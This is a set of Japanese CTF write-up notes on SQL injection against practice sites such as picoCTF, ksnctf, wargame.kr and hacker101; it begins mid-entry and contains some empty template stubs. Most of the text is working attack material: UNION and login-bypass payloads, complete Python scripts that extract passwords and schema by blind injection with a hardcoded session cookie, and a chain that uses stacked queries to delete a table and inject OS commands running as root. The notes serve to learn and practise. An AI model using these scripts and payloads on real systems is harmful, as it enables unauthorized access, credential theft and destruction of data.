' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
```
これで得られたクレデンシャルでログインすればFlagが得られる。  
- **payload**  
```txt
' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
```
## Union query / DB empty / login  (EasyCTF 2017  Sql Injection 2)
https://ctftime.org/writeup/6016  
- **entrypoint**  
`power level over 9000`で`leet1337`というユーザーでログインする必要があるが、そのようなユーザーはDBには存在しないと問題文にある。Union selctで挿入すればよい。  
以下のような構成になっているらしい。  
```txt
select username, password, power_level, id from some-table where username="" and password="(our sql string)"
```
`" union select sleep(5),"leet1337","leet1337",9001`を挿入すると最後の`9001`が文字列ではないため、`9001"`となってしまいよろしくない。そのため、以下のように適当なテーブルからデータを取得してるっぽく描けばいい。(コメントしてもいいと思うけど)  
```txt
" union select sleep(5),"leet1337","leet1337",9001 from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME="password
```
- **payload**  
```txt
" union select sleep(5),"leet1337","leet1337",9001 from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME="password
```
## Union query / 検索フォーム (SECCON Beginners CTF 2019 Ramen)
https://nomizooon.hateblo.jp/entry/2019/05/27/190418  
- **entrypoint**  
検索フォームにSQLInjectionできる。  
`' or 1=1 -- -`でエラーにならないのでSQLInjection可能とわかる。  
以下のようにしてカラム数を特定すると３でエラーとなったので2とわかる。  
```txt
' order by 1 #

' order by 2 #

' order by 3 #  // エラー
```
以下でFlagテーブルのFlagカラムにあるとわかる。  
```txt
' UNION SELECT table_name,column_name from information_schema.columns #
```
以下でFlagゲット！  
```txt
' UNION SELECT flag,0 FROM flag #
```
- **payload**  
```txt
' UNION SELECT flag,0 FROM flag #
```

## Union query / login (DEFCON 21 CTF babysfirst)
https://emeth.jp/diary/2013/06/defcon-21-ctf-qualification-writeup/  
- **entrypoint**  
loin formがあり適当にログインすると以下のようなレスポンスヘッダが返るため、SQLInjection可能とわかる。  
```txt
X-Sql: select username from users where username='xxx' and password='yyy' limit 1;
```
`' or 1=1;--`を入れると`root`としてログインできるが、Flagは出ない。  
`' union select password from users where username='root';--`でrootのパスワードは見えるがFlagではない。  
SQLite3を使っているため、以下でいろいろ調べるとkeysというテーブルがあり、そこにFlagがあったらしい。  
```txt
' union select sql from sql_master where type='table' and name='users';--
```
```txt
' union select value from keys;--
```
- **payload**  
```txt
' union select value from keys;--
```

#
- **entrypoint**  
- **payload**  
#
- **entrypoint**  
- **payload**  

# 常設の練習
## picoCTF 2019
https://ctftime.org/task/9545  
### login bypass (Irish-Name-Repo 1)
`https://2019shell1.picoctf.com/problem/47253/`  
SQLインジェクションでadminとしてログインする。  

`admin`,`' or 1=1 -- -`でログイン成功！  
### login bypass (Irish-Name-Repo 2)
`https://2019shell1.picoctf.com/problem/60775/`  
`admin' --`,`なんでも`でusernameの方のSQLインジェクションで成功！  
passwordの方がフィルタリングされてるらしい。`or`が使えないので`||`とかで代用したりいろいろしたがダメだった。  
```txt
// 成功したやつ
admin' --
admin' -- -
admin' ; --
admin' ;#

// 成功しなかったやつ
admin' #
```
### login bypass (Irish-Name-Repo 3)
`https://2019shell1.picoctf.com/problem/47247/`  
htmlのhiddenとして`debug=0`という値をフォームでパスワードと一緒に送信しているので`debug=1`とすると、実行しようとしている
SQL構文がわかる。どうやらpasswordのテキストをrot13で変換してからSQLに突っ込んでいるらしい。  
`' be 1 -- -`とすると`' or 1 -- -`と変換されて以下のように成功！  
```txt
SQL query: SELECT * FROM admin where password = '' or 1 -- -'
```
### SQLite / Union query (Empire1)
`https://2019shell1.picoctf.com/problem/4155/index`  
![image](https://user-images.githubusercontent.com/56021519/103904535-be749400-5140-11eb-906a-43c20766de27.png)  
ログインページにSQLインジェクションがあるかと思えばそういうわけじゃない。  
適当にRegisterして入ってみる。  
![image](https://user-images.githubusercontent.com/56021519/103904708-fa0f5e00-5140-11eb-8396-72ab168d4a4c.png)  
いろいろ試した結果、`Add a Todo`の`'`を挿入するとInternal Server Errorが返り、SQLインジェクションに脆弱だとわかる。  
![image](https://user-images.githubusercontent.com/56021519/103904777-14493c00-5141-11eb-963e-9cbf02554d78.png)  
次にInternal Server Errorが出ないようにして有効にSQLとして動くInjectionを探す。  
Your TodosでSQL実行結果を確認できる。  
```txt
// Internal Server Error
'
' or 1
' or 1=! -- -

// エラーがでない
' || 1=1 || '     1が返る
' || 1=2 || '     0が返る
```
したがって、`' || <SQL>  || '`の構文ならInternal Server Errorを出さずにSQL実行できるとわかる！  
次に、問題文からsecretをDBから取り出す必要があるので、DBを特定する必要がある。  
`' || @@version || '`が成功すればMySQLかMSSQL、`' || version() || '`ならPostgeSQL、`' || sqlite_version() || '`ならSQLiteとわかる。  
今回はSQLiteのやつで`3.22.0 `が返る！  
https://sqliteonline.com/  
ここで適宜ちゃんとSQLite上で動作できるのか触りながらやるとよさそう。  
SQLiteでは、以下のようにして、DB内に存在するテーブルやカラムなどを表示できる！超楽！  
`group_concat()`を使わないと、一つずつしか返ってこない。`users,apps`とかの場合は`users`しか返してくれないので。  
```txt
// 存在するテーブル一覧を返す
SELECT tbl_name FROM sqlite_master
SELECT group_concat(tbl_name) FROM sqlite_master

// 存在するテーブルとそのカラムをセットで返す。こっちの方が情報量多い
SELECT sql FROM sqlite_master
SELECT group_concat(sql) FROM sqlite_master
```
以下のようにして`user`テーブルの`secret`カラムのデータを呼び出すとフラグゲット！  
```txt
' || (SELECT group_concat(secret) FROM user) || '
Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4} 

' || (SELECT secret FROM user) || '
Likes Oreos. 

' || (SELECT group_concat(tbl_name) FROM sqlite_master) || '
user,user,todo 

' || (SELECT tbl_name FROM sqlite_master) || '
user

' || (SELECT * FROM sqlite_master) || '
Internal Server error

' || (union select 10) || '
Internal Server error

' || (SELECT group_concat(sql) FROM sqlite_master) || '
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
```
## ksnctf
### blind Injection / SQLite3 (Login 6)
http://ctfq.sweetduet.info:10080/~q6/  
idとpassの入力フォームがあって、`admin`としてログインしたい。  
`' or '1'='1`でログイン成功したが、以下のソースが表示されて、adminのパスワードを特定する必要がある。  
```txt
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```
Sqliteを使っていることがわかる。Blindでadminのpasswordを特定する。  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse

url = "http://ctfq.sweetduet.info:10080/~q6/"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["."," ","-","+","_",":","<",">",";","'","\"","(",")","=","{","}","[","]","\\","|","/","@","$","!","?","&","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url
    data = "id=" + urllib.parse.quote(attack_sql) + "&pass=" + urllib.parse.quote("pass")
    #print(data)
    headers.update([('Content-Type','application/x-www-form-urlencoded')])
    res = requests.post(attack_url, headers=headers,verify=False,data=data)
    #print(res.text)
    return res

def create_pass_query(pw):
    # admin' and substr(pass,1,1)='f' -- -
    query = "admin' and substr(pass," + str(len(pw)) + ",1)='"+pw[-1]+"' -- -"
    print(query)
    return query

def check_result(res):
    if 'Congratulations!' in res.text:
        return True
    return False

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        query = create_pass_query(try_pass)
        res = attack(query)
        if check_result(res):
            fix_pass += c
            break
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
```
`substr`を使うとFlagゲット！  
```txt
$ python3 exploit-substr.py


admin' and substr(pass,22,1)='!' -- -
FLAG_KpWa4ji3uZk6TrPK?
admin' and substr(pass,22,1)='?' -- -
FLAG_KpWa4ji3uZk6TrPK&
admin' and substr(pass,22,1)='&' -- -
FLAG_KpWa4ji3uZk6TrPK#
admin' and substr(pass,22,1)='#' -- -
result: FLAG_KpWa4ji3uZk6TrPK
```
ちなみに、SQLite3では`like`を使うと大文字小文字を区別せず、`=`を使えば区別する。  
MySQLでは`like`も`=`も両方区別しない。  
https://sutara-lumpur.hatenadiary.org/entry/20120818/1345280287#20120818_4  
したがって、以下のような`like`を使ったBlindでは全部小文字のFlagになって正常なFlagが得られない。  
```python
def create_pass_query(pw):
    query = "admin' and pass like '" + pw + "%' -- -"
    print(query)
    return query
```
以下は全部小文字になってしまってるFlag。  
```txt
admin' and pass like 'flag_kpwa4ji3uzk6trpk&%' -- -
flag_kpwa4ji3uzk6trpk#
admin' and pass like 'flag_kpwa4ji3uzk6trpk#%' -- -
result: flag_kpwa4ji3uzk6trpk
```
あと、以下のように`unicode`(mysqlでのascii)を使うとなんかうまく行かなかった…なんでだ？？？  
```txt
admin' and unicode(substr(pass,1,1))=100 -- -
admin' and unicode(substr(pass,1,1))=101 -- -
admin' and unicode(substr(pass,1,1))=102 -- -
admin' and unicode(substr(pass,1,1))=103 -- -
admin' and unicode(substr(pass,1,1))=104 -- -
```
## wargame.kr
### inject into order by / blind Injection (dbms335)
https://taiyakon.com/2017/09/ctfwargamekr-19-dbms335writeup.html  
- **entrypoint**  
```php
<?php
if (isset($_GET['view-source'])) {
    show_source(__FILE__);
    exit();
}
include("./inc.php");
include("../lib.php");
//usleep(200000*rand(2,3));
if(isset($_POST['sort'])){
 $sort=$_POST['sort'];
}else{
 $sort="asc";
}
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html>
 <head>
  <style type="text/css">
   body {background-color:#eaeafe;}
   #title {text-align:center; font-size:22pt; border:1px solid #cacaca;}
   #reg:hover {color:#557; cursor:pointer;}
   #contents {text-align:center; width:550px; margin: 30px auto;}
   #admin_tbl {width:100%;}
   #admin_tbl thead tr td {border-bottom:1px solid #888; font-weight:bold;}
   #admin_tbl tbody tr td {border-bottom:1px solid #aaa;}
   #admin_tbl #reg {width:200px;}
  </style>
  <script type="text/javascript" src="./jquery.min.js"></script>
  <script type="text/javascript" src="./jquery.color-RGBa-patch.js"></script>
  <script type="text/javascript"> var sort="<?php echo $sort; ?>"; </script>
  <script type="text/javascript" src="./main.js"></script>
 </head>
 <body>
  <div id="title"> Lonely guys Management page </div>
  <div id="contents">
   <table id="admin_tbl">
    <thead>
     <tr><td>the list of guys that need a girlfriend.</td><td id="reg">reg_single <sub>(sort)</sub></td></tr>
    </thead>
    <tbody>
     <?php
      mysql_query("update authkey set authkey='".auth_code('lonely guys')."'");
      $sort = mysql_real_escape_string($sort);
      $result=mysql_query("select * from guys_tbl order by reg_date $sort");
      while($row=mysql_fetch_array($result)){
       echo "<tr><td>$row[1]</td><td>$row[2]</td></tr>";
      }
     ?>
    </tbody>
   </table>
  </div>
  <div style="text-align:center;">
      <a href="?view-source">view-source</a>
  </div>
 </body>
</html>
```
以下が怪しい。`mysql_real_escape_string`はPHP7以降は削除された関数で`\x00`,`\`,`'`,`"`,`\n`,`\r`,`\x1a`をエスケープしてくれるが、それだけなので`or 1=1`みたいにすると普通にInjectionできる！  
今回も`'$sort'`とされていないのでSQLInjection可能とわかる。  
```php
      mysql_query("update authkey set authkey='".auth_code('lonely guys')."'");
      $sort = mysql_real_escape_string($sort);
      $result=mysql_query("select * from guys_tbl order by reg_date $sort");
```
`order by`句の中にInjectできる場合は以下のようにして、order byが複数行副問い合わせを受け付けないことを利用した有名なBlindができるらしい。  
https://notsosecure.com/injection-in-order-by-clause/  
```txt
mysql> select id from news where id =1 order by 1, (select case when (1=1) then 1 else 1*(select table_name from information_schema.tables)end)=1;
+——+
| id   |
+——+
|    1 | 
+——+
1 row in set (0.00 sec)
—-
mysql> select id from news where id =1 order by 1, (select case when (1=2) then 1 else 1*(select table_name from information_schema.tables)end)=1;
ERROR 1242 (21000): Subquery returns more than 1 row
—–
```
- **payload**  

## hacker101 CTF
### Photo Gallery
`https://ctf.hacker101.com/ctf`  
以下のページが問題。  
![image](https://user-images.githubusercontent.com/56021519/103919476-698e4900-5153-11eb-81ed-604ffc2c9917.png)  
`http://35.227.24.107/2116b46989/fetch?id=1`で`1`,`2`の時に画像データを返すらしい。  
おそらく`select data from images where id=1`とかになってるはずと推測する(idはintなので)。  
`1 and 1=1 -- -`で画像データが返り、`1 and 1=2 -- -`でなNot Foundが返ったのでBlind可能！  
Union queryも試したがダメっぽい？  
```txt
1 union select 1 -- -
1に対応する猫の画像が返った

0 union select 1 -- -
internal server error
```
以下のように  
https://sqliteonline.com/  
で実験すると、`id=0`として失敗させたときは`union select`が取り出されると思ったんだけど……  
![image](https://user-images.githubusercontent.com/56021519/103920720-f7b6ff00-5154-11eb-86d9-fabb4b5fad14.png)  
![image](https://user-images.githubusercontent.com/56021519/103920784-0bfafc00-5155-11eb-9313-b2415a015930.png)  
以下の単純な全探索のBlindで`@@version`を試している。これでバージョンがゲットできたので、DBはMySQLとわかる。  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_","-","+","@","$","!","?","&",".","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_pass_query(pw):
    query = " and if(substr(@@version," + str(len(pw)) + ",1)='" + pw[-1] + "',1=1,1=3) -- -"
    #print(query)
    return query

def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        query = create_pass_query(try_pass)
        res = attack(query)
        if check_result(res):
            fix_pass += c
            break
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
```
**mysql-enum-databases-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]
```
```txt
$ python3 mysql-enum-databases-get-binarysearch.py

省略

[-] exploit finished
information_schema
level5
mysql
performance_schema
```
**mysql-enum-tables-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]

```
```txt
$ python3 mysql-enum-tables-get-binarysearch.py

[-] exploit finished
albums
photos
```
```txt
[-] exploit finished
columns_priv
column_stats
db
event
func
general_log
gtid_slave_pos
help_category
help_keyword
help_relation
help_topic
host
index_stats
innodb_index_stats
innodb_table_stats
plugin
proc
procs_priv
proxies_priv
roles_mapping
servers
slow_log
tables_priv
table_stats
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```
**photosのカラム数**  
```txt
$ python3 mysql-count-columns-get-fullsearch.py
0
 AND if(substr((SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'level5' AND table_name like 'photos'),1,1)='0',1=1,1=3)#
 
result: 4
```
**albumsのカラム**  
```txt
[-] exploit finished
id
title
```
**photosのカラム**  
```txt
result: id,title,filename,parent
```
```txt
// 指定したDB、テーブルの持つカラム数を表示
SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo';
SELECT COUNT(*) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo'

// 指定したDBのテーブル数を表示
SELECT table_name from  information_schema.columns where table_schema like 'db44364' group by table_name

// 指定したDB、テーブルの持つカラムを結合して1行で表示
SELECT group_concat(column_name) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo'
```
```python
database = "level5"
table = "photos"
column1 = "title"
column2 = "filename"
column3 = "parent"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
ちなみに以下は完全なFlagじゃないです。ちょっと隠してます。  
```txt
[-] exploit finished
Utterly adorable:files/adorable.jpg:1
Purrfect:files/purrfect.jpg:1
Invisible:b92cc0e3169????????036b499674:1
```
```python
database = "level5"
table = "albums"
column1 = "title"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
```txt
[-] exploit finished
Kittens
```
#### flag0 (Union query)
ファイル名をSQLでidから取り出していることが考えられるので、`0 union select '../../main.py'`として有効なファイル名を強引に渡せばよいらしい！  
`0 union select 1`でInternal Server Errorとなっていたのは、ファイル名として1が取り出され、それをpythonでreadしようとしてerrorが発生したからである。  
ヒントから`uwsgi-nginx-flask-docker`を使っているとわかり、main.pyを使っていることとそのパスを推測できるらしい……  
https://github.com/tiangolo/uwsgi-nginx-flask-docker  
```txt
from flask import Flask, abort, redirect, request, Response import base64, json, MySQLdb, os, re, subprocess app = Flask(__name__) home = '''
Magical Image Gallery
$ALBUMS$ ''' viewAlbum = '''
$TITLE$
$GALLERY$ ''' def getDb(): return MySQLdb.connect(host="localhost", user="root", password="", db="level5") def sanitize(data): return data.replace('&', '&').replace('<', '<').replace('>', '>').replace('"', '"') @app.route('/') def index(): cur = getDb().cursor() cur.execute('SELECT id, title FROM albums') albums = list(cur.fetchall()) rep = '' for id, title in albums: rep += '
%s
\n' % sanitize(title) rep += '
' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, )) fns = [] for pid, ptitle, pfn in cur.fetchall(): rep += '

%s
' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404) # It's dangerous to go alone, take this: # ^FLAG^59540711ea6225ea87c7e????????????b3275666ec6b5$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
```
### flag1 (blind Injection)
```python
database = "level5"
table = "photos"
column1 = "title"
column2 = "filename"
column3 = "parent"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
```txt
[-] exploit finished
Utterly adorable:files/adorable.jpg:1
Purrfect:files/purrfect.jpg:1
Invisible:b92cc0e5d5c3269??????????92036b499674:1
```
### flag2 (Stack query / OS Command Injection)
`printenv`で環境変数を見ればいいらしい。  
flag0でゲットしたソースは以下の通り。`subprocess.check_output('du -ch %s `でphotosテーブルのfilenameの名前を`du`コマンドに結合しており、OS Command Injectionが可能である！  
ここには外部からの入力を入れる場所はないが、今は任意のSQLを実行できる状態なので、Stack Query型で任意のfilenameの名前にすればInject可能！  
`DELETE from photos;commit;`でphotosテーブルを削除する。`commit`でトランザクションを完了しないと、DELETEしたことにならないので必ず`commit`をつけないとダメ！  
`INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で任意の名前のデータを挿入する。`id`カラムは勝手についてくれるので残りの`title`,`filename`,`parent`を指定する。  

```python
@app.route('/')
def index():
    cur = getDb().cursor()
    cur.execute('SELECT id, title FROM albums')
    albums = list(cur.fetchall())
    rep = ''
    for id, title in albums:
        rep += '<h2>%s</h2>\n' % sanitize(title)
        rep += '<div>'
        cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
        fns = []
        for pid, ptitle, pfn in cur.fetchall():
            rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
            fns.append(pfn)
        rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
        rep += '</div>\n'
    return home.replace('$ALBUMS$', rep)
@app.route('/fetch')
def fetch():
    cur = getDb().cursor()
    if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
        abort(404)
    # It's dangerous to go alone, take this:
    # ^FLAG^hehehehe$FLAG$
    return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```
`0;DELETE from photos;commit;`でテーブル内を削除した後、  
`0;INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で`id`コマンドを実行するようにしてみると、以下のようにidコマンドが実行できた！  
```txt
;id
Space used: uid=0(root) gid=0(root) groups=0(root)
```
`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';echo$(printenv)', ';echo$(printenv)',1); commit;`をすると、以下のように2行目以降が見えない……  
```txt
Space used: /bin/sh: 1: echoPYTHONIOENCODING=UTF-8: not found
```
`;echo$(printenv)| tr -d "\n"`で1行にまとめられると思ったけど、`.strip().rsplit('\n', 1)[-1]`で改行を区切り文字として最後の要素を取り出すのでこの場合は`"`が取り出されてしまう。  
`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';printenv>files/output1', ';printenv>files/output1',1); commit;`としてファイルに結果を書きこんでからそれを表示すれば解決した。  
`0 union select 'files/output1'`  
```txt
PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi 
SUPERVISOR_GROUP_NAME=uwsgi FLAGS=
["^FLAG^59540711ea6225e?????????66ec6b5$FLAG$", 
"^FLAG^b92cc0e313bc00694e49??????????2036b499674$FLAG$", 
"^FLAG^aa435df54378ebcdc51825??????????f00b367efe$FLAG$"] 
HOSTNAME=0afaf3213fe1 SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root 
GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 
UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1~stretch 
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
